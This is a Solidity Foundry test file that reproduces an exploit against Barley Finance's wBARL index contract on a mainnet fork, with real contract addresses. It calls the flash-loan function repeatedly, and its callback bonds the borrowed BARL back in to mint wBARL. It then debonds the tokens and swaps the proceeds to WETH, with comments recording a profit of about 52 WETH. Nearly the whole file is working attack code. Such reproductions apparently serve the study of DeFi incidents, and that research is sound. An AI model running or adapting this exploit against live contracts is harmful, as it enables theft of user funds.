// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV3.sol";

import "./IWeightedIndex.sol";

IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
IERC20 constant BARL = IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IWeightedIndex constant wBARL = IWeightedIndex(
    payable(0x04c80Bb477890F3021F03B068238836Ee20aA0b8)
);
IUniswapV3Router constant UniV3Router = IUniswapV3Router(
    payable(0xE592427A0AEce92De3Edee1F18E0157C05861564)
);

contract BarleyFinanceTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19106654);
        vm.label(address(DAI), "DAI");
        vm.label(address(BARL), "BARL");
        vm.label(address(WETH), "WETH");
        vm.label(address(wBARL), "wBARL");
        vm.label(address(UniV3Router), "UniV3Router");

        // DAI tokens will be used by wBARL flash function
        deal(address(DAI), address(this), 200 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("WETH balance before", WETH.balanceOf(address(this)), 18);

        DAI.approve(address(wBARL), type(uint256).max);
        BARL.approve(address(UniV3Router), type(uint256).max);

        uint8 i;
        // 每次10DAI 一共200DAI
        while (i < 20) {
            wBARL.flash(
                address(this),
                address(BARL),
                BARL.balanceOf(address(wBARL)),
                ""
            );
            ++i;
        }

        // print("get wBARL", wBARL.balanceOf(address(this)), 18);
        // get wBARL: 170516633.489172605662725360

        address[] memory token = new address[](1);
        token[0] = address(BARL);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100;
        wBARL.debond(wBARL.balanceOf(address(this)), token, percentage);

        BARLToWETH();

        print("WETH balance after", WETH.balanceOf(address(this)), 18);
        // WETH balance after: 52.133956080457251524
    }

    function callback(bytes calldata data) external {
        data;
        BARL.approve(address(wBARL), BARL.balanceOf(address(this)));
        wBARL.bond(address(BARL), BARL.balanceOf(address(this)));
    }

    function BARLToWETH() internal {
        bytes memory _path = abi.encodePacked(
            address(BARL),
            hex"002710",
            address(DAI),
            hex"0001f4",
            address(WETH)
        );
        ISwapRouter.ExactInputParams memory params = ISwapRouter
            .ExactInputParams({
                path: _path,
                recipient: address(this),
                deadline: block.timestamp + 1000,
                amountIn: BARL.balanceOf(address(this)),
                amountOutMinimum: 0
            });
        UniV3Router.exactInput(params);
    }
}
